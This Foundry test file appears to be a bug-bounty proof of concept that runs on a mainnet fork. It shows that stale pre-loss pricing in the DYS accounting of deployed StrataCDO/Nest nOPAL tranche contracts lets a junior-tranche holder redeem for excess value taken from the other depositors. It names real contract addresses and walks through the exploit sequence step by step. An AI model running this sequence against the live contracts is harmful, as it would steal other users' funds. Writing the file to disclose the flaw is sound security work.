// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test, console2} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IERC20Metadata} from "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";
import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";

import {Tranche} from "../../contracts/tranches/Tranche.sol";
import {StrataCDO} from "../../contracts/tranches/StrataCDO.sol";
import {DYSAccounting} from "../../contracts/tranches/DYSAccounting.sol";
import {SharesCooldown} from "../../contracts/tranches/base/cooldown/SharesCooldown.sol";
import {NestOpalStrategy} from "../../contracts/tranches/strategies/nest/NestOpalStrategy.sol";
import {NestAccountantAprProvider} from "../../contracts/tranches/strategies/nest/NestAccountantAprProvider.sol";
import {INestAccountant, IAprSnapshotProvider} from "../../contracts/tranches/strategies/nest/interfaces/INestContracts.sol";
import {ICooldown, IERC20Cooldown} from "../../contracts/tranches/interfaces/cooldown/ICooldown.sol";
import {IStrataCDO} from "../../contracts/tranches/interfaces/IStrataCDO.sol";

/// @notice Deployed-mainnet proof of stale pre-loss DYS pricing combined with live lower nOPAL conversion.
/// @dev No transaction is broadcast. Third-party Nest rate observations are modeled with vm.mockCall only.
contract NestOpalDYSMainnetForkProofV3 is Test {
    address constant NOPAL = 0x119Dd7dAFf816f29D7eE47596ae5E4bdC4299165;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant ACCOUNTANT = 0x2Ed2f77a961fc92F73D1087786099c39C894Ed1D;
    address constant CDO = 0xaE212D8515BA65C719f23dBad6bF73B74d4e4edE;
    address constant STRATEGY = 0x5aeCBb5719a9468CdCfa6673d1DDC1Cf72a5a4aA;
    address constant ACCOUNTING = 0xB6F3d2deF3058d4Faf07E7104DE2f69c638f2BF7;
    address constant JRT = 0x1b2b8cFEF0b7B1Fad216b55fefeEb0c3349Da141;
    address constant SRT = 0x8a646Edc4633ADBA5Ec87DedaF3Af958e268FE96;

    uint256 constant ONE = 1e6;
    uint256 constant MIN_SEED = 10e6;
    uint256 constant ATTACKER_DEPOSIT = 1_000e6;
    uint256 constant ANCHOR_DEPOSIT = 1e6;
    uint256 constant DENOM = 10_000;
    uint256 constant UP = 10_005;   // +5 bps
    uint256 constant DOWN = 9_995;  // -5 bps

    Tranche jrt = Tranche(JRT);
    Tranche srt = Tranche(SRT);
    StrataCDO cdo = StrataCDO(CDO);
    NestOpalStrategy strategy = NestOpalStrategy(STRATEGY);
    DYSAccounting accounting = DYSAccounting(ACCOUNTING);
    INestAccountant accountant = INestAccountant(ACCOUNTANT);

    address attacker;
    address anchorUser;
    uint256 attackerShares;
    uint256 updateStep;
    uint256 upperBound;
    uint256 lowerBound;

    struct ExitPlan {
        bool locked;
        uint32 lockSeconds;
    }

    struct Outcome {
        uint256 nOpalOut;
        uint256 valueAtLossRate;
        uint256 jrtNav;
        uint256 srtNav;
        uint256 reserveNav;
    }

    function setUp() public {
        vm.createSelectFork(vm.envString("ETH_RPC_URL"));
        attacker = makeAddr("forkAttacker");
        anchorUser = makeAddr("anchorUser");

        _assertGraph();
        assertGt(jrt.totalAssets(), MIN_SEED, "JRT below Immunefi seed minimum");
        assertGt(srt.totalAssets(), MIN_SEED, "SRT below Immunefi seed minimum");
        assertEq(IERC20Metadata(NOPAL).decimals(), 6, "unexpected nOPAL decimals");
        assertEq(IERC20Metadata(USDC).decimals(), 6, "unexpected USDC decimals");

        INestAccountant.AccountantState memory st = accountant.accountantState();
        upperBound = uint256(st.allowedExchangeRateChangeUpper);
        lowerBound = uint256(st.allowedExchangeRateChangeLower);
        assertGe(upperBound, UP, "Nest live upper bound rejects +5bps");
        assertLe(lowerBound, DOWN, "Nest live lower bound rejects -5bps");
        updateStep = Math.max(1 hours, uint256(st.minimumUpdateDelayInSeconds));
        assertLt(updateStep, 24 hours, "Nest update delay prevents sequence inside 24h");

        deal(NOPAL, attacker, ATTACKER_DEPOSIT, true);
        vm.startPrank(attacker);
        IERC20(NOPAL).approve(JRT, ATTACKER_DEPOSIT);
        attackerShares = jrt.deposit(NOPAL, ATTACKER_DEPOSIT, attacker);
        vm.stopPrank();
        assertGt(attackerShares, 0, "attacker received no JRT");
    }

    function test_Fork_V3_DeployedGraphAndExitModeAreReachable() public view {
        _assertGraph();
        (IStrataCDO.TExitMode mode, uint256 fee, uint32 lockSeconds) = cdo.calculateExitMode(JRT, attacker);
        assertTrue(mode == IStrataCDO.TExitMode.Fee || mode == IStrataCDO.TExitMode.SharesLock, "unexpected JRT exit mode");
        console2.log("fork block", block.number);
        console2.log("fork timestamp", block.timestamp);
        console2.log("JRT NAV", jrt.totalAssets());
        console2.log("SRT NAV", srt.totalAssets());
        console2.log("coverage ppm", cdo.coverage());
        console2.log("exit mode", uint256(mode));
        console2.log("exit fee 1e18", fee);
        console2.log("shares lock seconds", lockSeconds);
        console2.log("strategy nOPAL cooldown", strategy.nOpalCooldownJrt());
    }

    function test_Fork_V3_PositiveAnchorThenNegativeRateProducesTemporalMismatch() public {
        uint256 positiveRate = _createPositiveAnchor();
        uint256 lossRate = _modelNegative(positiveRate);
        uint256 nav0 = accounting.nav();
        uint256 anchor = accounting.lastReconciliation();

        uint256 raw = strategy.totalAssets();
        uint256 gated = strategy.totalAssets(nav0, anchor);
        assertLt(raw, nav0, "lower rate did not reduce realizable NAV");
        assertEq(gated, nav0, "DYS did not hold negative NAV stale");

        uint256 base = 100e6;
        uint256 liveTokens = strategy.convertToTokens(NOPAL, base, Math.Rounding.Ceil);
        uint256 preLossTokens = Math.mulDiv(base, ONE, positiveRate, Math.Rounding.Ceil);
        assertGt(liveTokens, preLossTokens, "lower live rate did not increase nOPAL settlement");

        console2.log("positive rate", positiveRate);
        console2.log("negative rate", lossRate);
        console2.log("stored NAV", nav0);
        console2.log("raw NAV", raw);
        console2.log("gated NAV", gated);
    }

    function test_Fork_V3_PreExistingJrtHolderExternalizesRealizedLoss() public {
        ExitPlan memory plan = _prepareExit();
        uint256 positiveRate = _createPositiveAnchor();
        uint256 anchor = accounting.lastReconciliation();
        uint256 lossRate = _modelNegative(positiveRate);
        uint256 nav0 = accounting.nav();

        assertLt(strategy.totalAssets(), nav0, "no realized downside");
        assertEq(strategy.totalAssets(nav0, anchor), nav0, "negative NAV not stale inside 24h");

        if (!plan.locked) {
            (IStrataCDO.TExitMode mode,, uint32 lockSeconds) = cdo.calculateExitMode(JRT, attacker);
            assertEq(uint256(mode), uint256(IStrataCDO.TExitMode.Fee), "tiny loss crossed exit tier");
            assertEq(lockSeconds, 0, "Fee mode unexpectedly locked");
            assertGe(jrt.maxRedeem(attacker), attackerShares, "attacker shares capped");
        }

        uint256 snap = vm.snapshot();

        vm.warp(anchor + 24 hours + 1);
        assertLt(strategy.totalAssets(nav0, accounting.lastReconciliation()), nav0, "control did not expose loss");
        Outcome memory control = _settle(plan, lossRate);

        vm.revertTo(snap);
        Outcome memory attack = _settle(plan, lossRate);

        assertGt(attack.nOpalOut, control.nOpalOut, "stale path did not grant excess nOPAL");
        assertGt(attack.valueAtLossRate, control.valueAtLossRate, "stale path did not grant excess live value");

        uint256 attackerGain = attack.valueAtLossRate - control.valueAtLossRate;
        uint256 controlRemaining = control.jrtNav + control.srtNav + control.reserveNav;
        uint256 attackRemaining = attack.jrtNav + attack.srtNav + attack.reserveNav;
        assertGt(controlRemaining, attackRemaining, "remaining capital did not lose value");
        uint256 remainingLoss = controlRemaining - attackRemaining;
        assertApproxEqAbs(attackerGain, remainingLoss, 50, "attacker gain not conserved against remaining loss");

        console2.log("SharesLock path", plan.locked ? uint256(1) : uint256(0));
        console2.log("positive anchor rate", positiveRate);
        console2.log("negative loss rate", lossRate);
        console2.log("control nOPAL entitlement", control.nOpalOut);
        console2.log("attack nOPAL entitlement", attack.nOpalOut);
        console2.log("attacker excess value USDC 6d", attackerGain);
        console2.log("remaining capital loss USDC 6d", remainingLoss);
    }

    function _assertGraph() internal view {
        assertGt(CDO.code.length, 0, "CDO missing");
        assertGt(STRATEGY.code.length, 0, "strategy missing");
        assertGt(ACCOUNTING.code.length, 0, "accounting missing");
        assertGt(JRT.code.length, 0, "JRT missing");
        assertGt(SRT.code.length, 0, "SRT missing");
        assertEq(address(cdo.strategy()), STRATEGY, "strategy mismatch");
        assertEq(address(cdo.accounting()), ACCOUNTING, "accounting mismatch");
        assertEq(address(cdo.jrtVault()), JRT, "JRT mismatch");
        assertEq(address(cdo.srtVault()), SRT, "SRT mismatch");
        assertEq(address(strategy.nOPAL()), NOPAL, "nOPAL mismatch");
        assertEq(address(strategy.USDC()), USDC, "USDC mismatch");
        assertEq(address(strategy.accountant()), ACCOUNTANT, "accountant mismatch");
        assertGt(address(strategy.aprProvider()).code.length, 0, "APR provider missing");
        assertGt(address(cdo.sharesCooldown()).code.length, 0, "SharesCooldown missing");
        assertGt(address(strategy.erc20Cooldown()).code.length, 0, "ERC20Cooldown missing");
        assertEq(jrt.asset(), USDC, "JRT base not USDC");
        assertEq(srt.asset(), USDC, "SRT base not USDC");
    }

    function _prepareExit() internal returns (ExitPlan memory plan) {
        (IStrataCDO.TExitMode mode,, uint32 lockSeconds) = cdo.calculateExitMode(JRT, attacker);
        if (mode == IStrataCDO.TExitMode.Fee) {
            assertEq(lockSeconds, 0, "Fee mode has lock");
            assertGe(jrt.maxRedeem(attacker), attackerShares, "attacker not redeemable");
            return ExitPlan(false, 0);
        }

        assertEq(uint256(mode), uint256(IStrataCDO.TExitMode.SharesLock), "unsupported exit mode");
        assertGt(lockSeconds, 0, "SharesLock with zero lock");
        uint256 beforeBal = IERC20(NOPAL).balanceOf(attacker);
        vm.prank(attacker);
        uint256 quote = jrt.redeem(NOPAL, attackerShares, attacker, attacker);
        assertGt(quote, 0, "SharesLock quote zero");
        assertEq(IERC20(NOPAL).balanceOf(attacker), beforeBal, "SharesLock settled immediately");
        assertEq(jrt.balanceOf(attacker), 0, "shares not moved to cooldown");
        vm.warp(block.timestamp + uint256(lockSeconds) + 1);
        return ExitPlan(true, lockSeconds);
    }

    function _createPositiveAnchor() internal returns (uint256 positiveRate) {
        uint256 liveRate = accountant.getRateInQuoteSafe(USDC);
        (uint96 providerRate,) = _latestSnapshot();
        uint256 strategyShares = IERC20(NOPAL).balanceOf(STRATEGY);
        assertGt(liveRate, 0, "live rate missing");
        assertGt(strategyShares, 0, "strategy has no nOPAL");

        uint256 rateForPositiveNav = Math.mulDiv(accounting.nav() + 1, ONE, strategyShares, Math.Rounding.Ceil);
        positiveRate = Math.max(liveRate + 1, uint256(providerRate) + 1);
        positiveRate = Math.max(positiveRate, rateForPositiveNav);
        uint256 maxAllowed = Math.mulDiv(liveRate, upperBound, DENOM);
        assertLe(positiveRate, maxAllowed, "positive anchor exceeds live Nest bound; use synchronized fork block");

        vm.warp(block.timestamp + updateStep);
        uint64 ts = uint64(block.timestamp);
        _mockRate(positiveRate, ts);

        IAprSnapshotProvider provider = strategy.aprProvider();
        assertFalse(provider.isNegativeChange(uint96(positiveRate)), "positive rate classified negative");
        assertTrue(provider.isMeaningfulUpdate(uint96(positiveRate), ts), "positive update not meaningful");
        uint256 oldAnchor = accounting.lastReconciliation();
        assertGt(strategy.totalAssets(), accounting.nav(), "positive update did not raise raw NAV");

        deal(NOPAL, anchorUser, ANCHOR_DEPOSIT, true);
        vm.startPrank(anchorUser);
        IERC20(NOPAL).approve(JRT, ANCHOR_DEPOSIT);
        uint256 shares = jrt.deposit(NOPAL, ANCHOR_DEPOSIT, anchorUser);
        vm.stopPrank();
        assertGt(shares, 0, "anchor deposit minted no JRT");
        assertGt(accounting.lastReconciliation(), oldAnchor, "positive NAV not reconciled");
        assertEq(accounting.lastReconciliation(), ts, "anchor timestamp mismatch");

        (uint96 snapRate, uint64 snapTs) = _latestSnapshot();
        assertEq(uint256(snapRate), positiveRate, "positive rate not snapshotted");
        assertEq(uint256(snapTs), ts, "snapshot time mismatch");
        vm.clearMockedCalls();
    }

    function _modelNegative(uint256 positiveRate) internal returns (uint256 lossRate) {
        vm.warp(block.timestamp + updateStep);
        uint64 ts = uint64(block.timestamp);
        lossRate = Math.mulDiv(positiveRate, DOWN, DENOM);
        if (lossRate >= positiveRate) lossRate = positiveRate - 1;
        uint256 minAllowed = Math.mulDiv(positiveRate, lowerBound, DENOM);
        assertGe(lossRate, minAllowed, "negative rate exceeds live Nest downside bound");
        _mockRate(lossRate, ts);

        IAprSnapshotProvider provider = strategy.aprProvider();
        assertTrue(provider.isNegativeChange(uint96(lossRate)), "lower rate not classified negative");
        assertTrue(provider.isMeaningfulUpdate(uint96(lossRate), ts), "lower rate not meaningful");
        uint256 nav0 = accounting.nav();
        uint256 anchor = accounting.lastReconciliation();
        assertLt(strategy.totalAssets(), nav0, "lower rate created no downside");
        assertLt(block.timestamp - anchor, 24 hours, "negative update outside DYS window");
        assertEq(strategy.totalAssets(nav0, anchor), nav0, "negative NAV not gated stale");
    }

    function _settle(ExitPlan memory plan, uint256 lossRate) internal returns (Outcome memory out) {
        uint256 beforeEntitlement = _entitlement(attacker);
        if (plan.locked) {
            uint256 claimed = SharesCooldown(address(cdo.sharesCooldown())).finalize(IERC20(JRT), attacker);
            assertGt(claimed, 0, "matured SharesLock finalized zero");
        } else {
            vm.prank(attacker);
            uint256 quoted = jrt.redeem(NOPAL, attackerShares, attacker, attacker);
            assertGt(quoted, 0, "Fee redemption quoted zero");
        }

        uint256 afterEntitlement = _entitlement(attacker);
        assertGt(afterEntitlement, beforeEntitlement, "no nOPAL entitlement created");
        out.nOpalOut = afterEntitlement - beforeEntitlement;
        out.valueAtLossRate = Math.mulDiv(out.nOpalOut, lossRate, ONE);
        (out.jrtNav, out.srtNav, out.reserveNav) = accounting.totalAssetsUnprojected();
    }

    function _entitlement(address user) internal view returns (uint256 amount) {
        amount = IERC20(NOPAL).balanceOf(user);
        IERC20Cooldown cooldown = strategy.erc20Cooldown();
        ICooldown.TBalanceState memory st = cooldown.balanceOf(IERC20(NOPAL), user);
        amount += st.pending + st.claimable;
    }

    function _latestSnapshot() internal view returns (uint96 rate, uint64 updatedAt) {
        NestAccountantAprProvider provider = NestAccountantAprProvider(address(strategy.aprProvider()));
        uint8 head = provider.head();
        uint8 prev = head == 0 ? 9 : head - 1;
        return provider.buffer(prev);
    }

    function _mockRate(uint256 rate, uint64 ts) internal {
        INestAccountant.AccountantState memory st = accountant.accountantState();
        st.exchangeRate = uint96(rate);
        st.lastUpdateTimestamp = ts;
        st.isPaused = false;
        vm.mockCall(ACCOUNTANT, abi.encodeWithSelector(INestAccountant.getRateInQuoteSafe.selector, USDC), abi.encode(rate));
        vm.mockCall(ACCOUNTANT, abi.encodeWithSelector(INestAccountant.accountantState.selector), abi.encode(st));
    }
}
